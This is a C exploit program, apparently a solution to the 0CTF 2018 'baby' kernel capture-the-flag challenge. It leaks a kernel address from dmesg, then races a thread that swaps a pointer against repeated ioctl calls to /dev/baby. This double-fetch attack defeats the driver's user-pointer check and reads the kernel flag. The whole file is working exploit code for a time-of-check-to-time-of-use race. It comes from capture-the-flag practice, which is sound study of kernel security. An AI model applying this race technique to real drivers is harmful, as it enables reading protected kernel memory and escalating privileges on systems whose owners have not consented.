/* https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/0CTF2018-baby */

#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>

#define N 0x10000
// for i in `seq 1 100`; do echo $i; ./exp1; sleep 0.1; done

struct arg {
    char *buf;
    size_t len;
};

char uflag[] = "YAY{SAMPLE_USERSPACE_FLAG}";
char **flag_kern;

struct arg arg = {uflag, 33};

int fd, done = 0;
char buf[256];


void *ioctl_userptr(void *a)
{
    while (!done) {
        ((struct arg *)a)->buf = flag_kern;
    }
    pthread_exit(NULL);
}


int main()
{

    pthread_t pt1;
    int i = N, j;
    int res;
    fd = open("/dev/baby", O_RDWR);
    perror("open");

    ioctl(fd, 0x6666);
    system("dmesg | grep \"is at\" > /tmp/dmesg");
    res = open("/tmp/dmesg", O_RDONLY);
    read(res, buf, 256);
    close(res);

    sscanf(buf+sizeof("[    3.981687]"), "Your flag is at %llx", &flag_kern);
    printf("flag at %#llx\n", flag_kern);


    for (j = 20; j < 40; j += 1) {
        printf("try len %d\n", j);
        arg.len = j;

        done = 0;
        pthread_create(&pt1, NULL, ioctl_userptr, &arg);
        for (i = N; i; i-=1) {
            res = ioctl(fd, 0x1337, &arg);
            arg.buf = uflag;
            if (res != 14 && res != 22) {
                break;
            }
        }
        done = 1;
        pthread_join(pt1, NULL);
        printf("%-5i\tioctl(0x1337)=%d (%d)\n", N - i, res, errno);
        if (!res)
            break;
    }
    system("dmesg | grep secret");
    close(fd);

    return 0;
}
